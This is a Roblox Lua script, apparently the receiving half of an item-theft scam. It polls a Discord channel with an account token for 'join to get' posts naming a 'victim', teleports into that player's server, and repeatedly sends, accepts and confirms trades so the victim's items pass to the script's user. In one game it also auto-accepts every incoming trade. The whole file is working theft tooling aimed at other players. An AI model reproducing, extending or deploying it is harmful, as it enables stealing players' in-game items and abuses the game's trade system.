if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- Services
local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Configuration check
if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
end

-- Anti-afk
local bb = game:GetService("VirtualUser")
Players.LocalPlayer.Idled:Connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

-- File setup
local victimFile = isfile("user.txt")
local joinedFile = isfile("joined_ids.txt")
if not victimFile then
    writefile("user.txt", "victim username")
end
if not joinedFile then
    writefile("joined_ids.txt", "[]")
end
local victimUser = readfile("user.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
local didVictimLeave = false
local timer = 0
local lastRequestTime = 0

-- Improved chat function
local function sendChatMessage(message)
    local success, err = pcall(function()
        -- Try new TextChatService first
        if TextChatService:FindFirstChild("RBXGeneral") then
            TextChatService.RBXGeneral:SendAsync(message)
        -- Fallback to old chat system
        elseif ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        end
    end)
    
    if not success then
        warn("Failed to send chat message:", err)
    end
end

-- Device selection
local function selectDevice()
    while task.wait(0.1) do
        local DeviceSelectGui = Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
        if DeviceSelectGui then
            local Container = DeviceSelectGui:WaitForChild("Container")
            local button = Container:WaitForChild("Phone"):WaitForChild("Button")
            local buttonPos = button.AbsolutePosition
            local buttonSize = button.AbsoluteSize
            local centerX = buttonPos.X + buttonSize.X / 2
            local centerY = buttonPos.Y + buttonSize.Y / 2
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
            VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
            break
        end
    end
end

task.spawn(selectDevice)

-- Special game setup (place ID 920587237)
local function setupSpecialGameFunctions()
    if game.PlaceId == 920587237 then
        local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
        local tradeFrame = playerGui.TradeApp.Frame
        local Loads = require(ReplicatedStorage.Fsys).load
        local RouterClient = Loads("RouterClient")
        local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
        local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
        local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
        local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
        local inventory = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Players.LocalPlayer.Name].inventory
        local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")

        TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
            TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
        end)

        local foodAdded = false

        local function IsTrading()
            return tradeFrame.Visible
        end

        local function acceptTrade()
            while task.wait(0.1) do
                if IsTrading() then
                    if not foodAdded then
                        local foodKeys = {}
                        for uid, data in pairs(inventory.food) do
                            table.insert(foodKeys, uid)
                        end
                        if #foodKeys > 0 then
                            local randomIndex = math.random(1, #foodKeys)
                            local randomFoodUid = foodKeys[randomIndex]
                            AddItemRemote:FireServer(randomFoodUid)
                            foodAdded = true
                        end
                    end
                    AcceptNegotiationRemote:FireServer()
                end
            end
        end

        local function confirmTrade()
            while task.wait(0.1) do
                if IsTrading() and foodAdded then
                    ConfirmTradeRemote:FireServer()
                end
            end
        end

        task.spawn(acceptTrade)
        task.spawn(confirmTrade)
        return true
    end
    return false
end

local isSpecialGame = setupSpecialGameFunctions()

-- Original game functions
if not isSpecialGame then
    local function acceptRequest()
        while task.wait() do
            local currentTime = tick()
            if currentTime - lastRequestTime >= 2 then
                ReplicatedStorage:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
                local args = {
                    [1] = Players:WaitForChild(victimUser)
                }
                ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
                lastRequestTime = currentTime
            end
        end
    end

    local function acceptTrade()
        while task.wait(0.1) do
            ReplicatedStorage:WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
        end
    end

    local function waitForPlayerLeave()
        Players.PlayerRemoving:Connect(function(removedPlayer)
            if removedPlayer.Name == victimUser then
                didVictimLeave = true
            end
        end)
    end

    local function IsTrading()
        local trade_status = ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
        return trade_status == "StartTrade"
    end

    local function tradeTimer()
        while task.wait(1) do
            if IsTrading() then
                timer = 0
            else
                timer = timer + 1
            end
        end
    end

    waitForPlayerLeave()
    task.spawn(acceptTrade)
    task.spawn(tradeTimer)
    wait(3)
    task.spawn(acceptRequest)
end

-- Send greeting message after everything is set up
task.delay(5, function()
    sendChatMessage("yo!")
end)

-- Improved Discord joining function
local function autoJoin()
    local success, response = pcall(function()
        return request({
            Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
            Method = "GET",
            Headers = {
                ['Authorization'] = token,
                ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                ["Content-Type"] = "application/json"
            }
        })
    end)

    if not success then
        warn("Failed to fetch Discord messages:", response)
        return
    end

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then
            return
        end

        for _, message in ipairs(messages) do
            if message.content and message.embeds and #message.embeds > 0 then
                local embed = message.embeds[1]
                if embed.title and embed.title:lower():find("join to get") then
                    -- Extract place ID and job ID
                    local placeId, jobId = message.content:match('TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
                    
                    if not placeId or not jobId then
                        placeId, jobId = message.content:match('game:GetService%(%"TeleportService%"%):TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
                    end

                    if placeId and jobId then
                        local newVictim = victimUser
                        if embed.fields and #embed.fields > 0 then
                            for _, field in ipairs(embed.fields) do
                                if field.name and field.name:lower():find("victim") and field.value then
                                    newVictim = field.value:gsub('@', ''):gsub('[<>]', '')
                                    break
                                end
                            end
                        end

                        if not table.find(joinedIds, message.id) then
                            table.insert(joinedIds, message.id)
                            writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
                            writefile("user.txt", newVictim)
                            
                            local teleportSuccess, teleportError = pcall(function()
                                TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
                            end)
                            
                            if not teleportSuccess then
                                warn("Failed to teleport:", teleportError)
                            else
                                return
                            end
                        end
                    end
                end
            end
        end
    else
        warn("Discord API error:", response.StatusCode, response.Body)
    end
end

-- Main loop
while task.wait(5) do
    autoJoin()
end
